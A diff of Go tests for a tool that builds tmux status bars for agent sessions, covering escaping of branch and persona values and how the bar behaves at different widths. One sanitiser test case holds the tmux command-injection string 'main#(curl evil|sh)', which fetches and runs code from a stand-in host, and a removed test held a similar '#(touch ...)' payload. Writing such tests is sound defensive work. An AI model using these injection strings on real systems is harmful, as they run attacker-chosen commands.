@@ -915,7 +915,7 @@ func TestIsSecretEnvKey(t *testing.T) {
 func TestSanitizeTmuxStatusValue(t *testing.T) {
 	cases := []struct{ name, in, want string }{
 		{"command-sub", "main#(curl evil|sh)", "main##(curl evil|sh)"},
-		{"format-expand", "a#{x}b", "a##{x}b"},
+		{"format-expand", "a#{x}b", "a##{x#}b"},
 		{"style", "c#[fg]d", "c##[fg]d"},
 		{"plain", "feature/foo", "feature/foo"},
 		{"hash-literal", "feat#123", "feat##123"},
@@ -1078,67 +1078,139 @@ func TestWorkbenchHeader_StripsControlChars(t *testing.T) {
 	}
 }
 
-// TestBuildStatusBarSettings_Persona covers issue #4535: a multi-persona team
-// launch used to render N identical status bars, so the user could not tell
-// which pane was which agent.
-func TestBuildStatusBarSettings_Persona(t *testing.T) {
-	t.Run("persona is rendered in status-left", func(t *testing.T) {
-		got := buildStatusBarSettings(StatusBarOpts{
-			Provider: "claude",
-			Branch:   "feat/dead-pane",
-			Project:  "vibeflow-cli",
-			Persona:  "principal_engineer",
-		})
-		if !strings.Contains(got["status-left"], "principal_engineer") {
-			t.Errorf("status-left has no persona: %q", got["status-left"])
-		}
-		// Persona takes the leading (teal) slot; provider and branch shift right.
-		wantOrder := []string{"principal_engineer", "claude", "feat/dead-pane"}
-		pos := -1
-		for _, want := range wantOrder {
-			at := strings.Index(got["status-left"], want)
-			if at < 0 {
-				t.Fatalf("status-left missing %q: %q", want, got["status-left"])
+// statusLeftAt expands a session's status-left format against a real tmux server
+// at the given window width. The format is only meaningful once tmux evaluates
+// it, so asserting on the raw format string would prove nothing about what the
+// user actually sees (issue #4671).
+func statusLeftAt(t *testing.T, tm *TmuxManager, width int, opts StatusBarOpts) string {
+	t.Helper()
+	name := "vibeflow_w" + itoa(width)
+	if _, err := tm.run("new-session", "-d", "-s", name, "-x", itoa(width), "-y", "24"); err != nil {
+		t.Skipf("cannot create tmux session: %v", err)
+	}
+	if err := tm.ConfigureStatusBar(name, opts); err != nil {
+		t.Fatalf("ConfigureStatusBar: %v", err)
+	}
+	out, err := tm.run("display-message", "-t", name, "-p", "-F", "#{E:status-left}")
+	if err != nil {
+		t.Fatalf("expand status-left: %v", err)
+	}
+	return out
+}
+
+func itoa(n int) string {
+	if n == 0 {
+		return "0"
+	}
+	var b []byte
+	for n > 0 {
+		b = append([]byte{byte('0' + n%10)}, b...)
+		n /= 10
+	}
+	return string(b)
+}
+
+// TestStatusBar_WidthTiers is the acceptance check for #4671: a shrinking
+// terminal must drop the LEAST identifying field first and never render a
+// half-formed bar. Asserted against a real tmux server at four widths, because
+// the tier logic lives in a tmux format and only tmux can evaluate it.
+func TestStatusBar_WidthTiers(t *testing.T) {
+	if _, err := exec.LookPath("tmux"); err != nil {
+		t.Skip("tmux not installed")
+	}
+	tm := NewTmuxManager("vftest-tiers")
+	_, _ = tm.run("kill-server")
+	defer func() { _, _ = tm.run("kill-server") }()
+	if err := tm.EnsureServer(); err != nil {
+		t.Skipf("cannot start tmux server: %v", err)
+	}
+
+	opts := StatusBarOpts{
+		Provider:     "claude",
+		Branch:       "feat/dead-pane",
+		Project:      "vibeflow-cli",
+		Persona:      "principal_engineer",
+		WorktreePath: "/tmp/wt",
+	}
+
+	for _, tc := range []struct {
+		width        int
+		wantVisible  []string
+		wantAbsent   []string
+		wantWorktree bool
+	}{
+		// Persona always survives: it is the field that tells two panes apart.
+		{width: 60, wantVisible: []string{"principal_engineer"},
+			wantAbsent: []string{"vibeflow-cli", "feat/dead-pane"}},
+		{width: 80, wantVisible: []string{"principal_engineer", "vibeflow-cli"},
+			wantAbsent: []string{"feat/dead-pane"}},
+		{width: 120, wantVisible: []string{"principal_engineer", "vibeflow-cli", "feat/dead-pane"},
+			wantWorktree: true},
+		// Widest tier also brings back the provider, the lowest-value field.
+		{width: 200, wantVisible: []string{"principal_engineer", "vibeflow-cli", "feat/dead-pane", "claude"},
+			wantWorktree: true},
+	} {
+		t.Run("width="+itoa(tc.width), func(t *testing.T) {
+			got := statusLeftAt(t, tm, tc.width, opts)
+			for _, want := range tc.wantVisible {
+				if !strings.Contains(got, want) {
+					t.Errorf("width %d: missing %q in %q", tc.width, want, got)
+				}
 			}
-			if at <= pos {
-				t.Errorf("status-left segments out of order at %q: %q", want, got["status-left"])
+			for _, absent := range tc.wantAbsent {
+				if strings.Contains(got, absent) {
+					t.Errorf("width %d: %q should have been dropped, got %q", tc.width, absent, got)
+				}
 			}
-			pos = at
-		}
-		// Project must remain visible alongside it (acceptance criterion).
-		if !strings.Contains(got["status-right"], "vibeflow-cli") {
-			t.Errorf("status-right lost the project: %q", got["status-right"])
-		}
-	})
-
-	t.Run("no persona renders exactly what shipped before", func(t *testing.T) {
-		// Pins the vanilla (non-vibeflow) session bar byte-for-byte, so the
-		// segment-list refactor provably did not change sessions that have no
-		// persona. If this string ever needs updating, it is a real UI change.
-		const want = "#[fg=#0b1929,bg=#00d4aa,bold] vibeflow #[fg=#00d4aa,bg=#152d45,nobold] claude #[fg=#576574]|#[fg=#c8d6e5] main "
-		got := buildStatusBarSettings(StatusBarOpts{Provider: "claude", Branch: "main"})
-		if got["status-left"] != want {
-			t.Errorf("vanilla status-left changed:\n got:  %q\n want: %q", got["status-left"], want)
-		}
-	})
-
-	t.Run("whitespace-only persona is treated as absent", func(t *testing.T) {
-		got := buildStatusBarSettings(StatusBarOpts{Provider: "claude", Branch: "main", Persona: "   "})
-		if strings.Contains(got["status-left"], "|  |") || strings.Contains(got["status-left"], "nobold]  ") {
-			t.Errorf("blank persona left an empty segment: %q", got["status-left"])
-		}
-	})
-
-	t.Run("persona cannot inject a tmux format string", func(t *testing.T) {
-		// Same class as the #3289 finding on branch names: persona reaches the
-		// status format from the server, so it must be escaped too.
-		got := buildStatusBarSettings(StatusBarOpts{
-			Provider: "claude",
-			Branch:   "main",
-			Persona:  "pe#(touch /tmp/vf_persona_pwned)",
+			if gotWt := strings.Contains(got, "[wt]"); gotWt != tc.wantWorktree {
+				t.Errorf("width %d: worktree marker = %v, want %v (%q)", tc.width, gotWt, tc.wantWorktree, got)
+			}
+			// A conditional that failed to parse leaves its raw syntax on screen.
+			if strings.Contains(got, "#{") || strings.Contains(got, "#{?") {
+				t.Errorf("width %d: unexpanded format leaked into output: %q", tc.width, got)
+			}
 		})
-		if strings.Contains(strings.ReplaceAll(got["status-left"], "##", ""), "#(") {
-			t.Errorf("persona left a live #( command-substitution: %q", got["status-left"])
+	}
+
+	t.Run("no worktree means no marker", func(t *testing.T) {
+		plain := opts
+		plain.WorktreePath = ""
+		if got := statusLeftAt(t, tm, 150, plain); strings.Contains(got, "[wt]") {
+			t.Errorf("non-worktree session shows the marker: %q", got)
 		}
 	})
+}
+
+// TestStatusBar_StructuralCharactersAreLiteral covers the blocker recorded on
+// #4671: once values sit inside #{?...} conditionals, ',' and '}' are STRUCTURAL.
+// An unescaped comma truncates the bar at the first comma and an unescaped brace
+// terminates the conditional early, leaking raw format text.
+func TestStatusBar_StructuralCharactersAreLiteral(t *testing.T) {
+	if _, err := exec.LookPath("tmux"); err != nil {
+		t.Skip("tmux not installed")
+	}
+	tm := NewTmuxManager("vftest-struct")
+	_, _ = tm.run("kill-server")
+	defer func() { _, _ = tm.run("kill-server") }()
+	if err := tm.EnsureServer(); err != nil {
+		t.Skipf("cannot start tmux server: %v", err)
+	}
+
+	got := statusLeftAt(t, tm, 200, StatusBarOpts{
+		Provider: "claude",
+		Branch:   "feat/comma,brace}branch",
+		Project:  "proj,with}chars",
+		Persona:  "dev",
+	})
+
+	for _, want := range []string{"proj,with}chars", "feat/comma,brace}branch"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("structural characters mangled: want %q inside %q", want, got)
+		}
+	}
+	// The branch segment is the last conditional before the provider one, so a
+	// swallowed comma would take the rest of the bar with it.
+	if !strings.Contains(got, "claude") {
+		t.Errorf("a structural character truncated the bar: %q", got)
+	}
 }
